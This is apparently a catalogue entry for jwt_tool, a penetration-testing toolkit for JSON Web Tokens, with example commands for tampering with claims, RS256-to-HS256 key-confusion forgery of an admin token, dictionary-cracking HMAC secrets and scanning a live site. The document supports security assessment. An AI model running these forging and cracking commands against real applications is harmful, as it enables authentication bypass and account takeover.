---
name: "jwt-tool"
categories:
  - blackarch-cracker
version: "v2.3.0.r0.g3bc7407"
homepage: "https://github.com/ticarpi/jwt_tool"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-13"
build-system: scripts
license: GPL-3.0-or-later
meta-checked: "2026-11-09"
github-repo: "ticarpi/jwt_tool"
github-stars: 6809
github-pushed: "2025-05-01"
github-archived: false
github-issues: 76
github-match: "exact"
gh-checked: "2026-11-07"
worth: 4.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# jwt-tool

> Toolkit for validating, forging, scanning, tampering and cracking JWTs.

## What it's for

jwt_tool is a Python 3 toolkit for assessing JSON Web Token implementations: decode and validate a token, tamper with header/payload claims and re-sign, run the known JWT exploits (alg:none, null/blank/psychic signatures, JWKS spoofing and injection, RS256→HS256 key confusion), dictionary-attack weak HMAC secrets, and scan a live application's token handling through its own request pipeline. Reach for it whenever you hold a JWT and need to know what it is signed with, whether the implementation mis-verifies it, or what its secret is. It does not exploit the surrounding application logic — it produces forged/attacked tokens and can send them to a target while watching responses.

## Typical use cases

### Decode and inspect a token

```
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
```

Outcome: prints the decoded header and payload with their claim values plus a basic validity check — the starting point for picking which claims to target and which attacks apply.

### Tamper with claims and re-sign

Change claim values interactively, then sign the result with a known key.

```
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U -T
```

Outcome: opens the interactive tamper menu listing header and payload claims; edit any value (e.g. `sub` → `admin`) and choose a signing option (keep alg, switch alg, sign with a provided key) to get a fresh, re-signed token ready to replay.

### RS256→HS256 key confusion using the server's public key

When the server verifies tokens as HMAC using material you can obtain, re-sign the token with its own RSA public key as the HMAC secret.

```
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.<signature> -X k -pk public.pem -I -pc sub -pv admin
```

Outcome: forges an HS256 token whose signature is the HMAC of the RSA public key in `public.pem`, with `sub` rewritten to `admin`. Replay it against the application — if it validates, signature verification is keyed on attacker-supplied material and authentication is bypassed.

### Crack a weak HMAC secret with a wordlist

```
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U -C -d jwt.secrets.list
```

Outcome: runs a high-speed dictionary attack over the supplied file against the token's signature; a hit prints the secret (and logs it), after which you can forge arbitrary tokens with `-T` and that key.

### Playbook-scan a live application's token handling

Send the token to the app and auto-test the common misconfigurations end to end.

```
python3 jwt_tool.py -t https://www.example.com/ -rc "jwt=eyJhbGciOi...<rest-of-token>;othercookie=test" -cv "Welcome" -M pb
```

Outcome: runs the Playbook scan (forced errors, alg confusion, exploit probes) through the real request pipeline using the supplied cookie (a request file can be passed with `-r` instead), reporting which probes produced anomalous responses — the `-cv` canary makes "token accepted" responses stand out.

### Verify a token against a known key

```
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U -V -pk public.pem
```

Outcome: checks the signature against the PEM key supplied (private key/JWKS file also supported) and reports whether the token is genuinely signed with it — useful to confirm a recovered or leaked key is the real one.
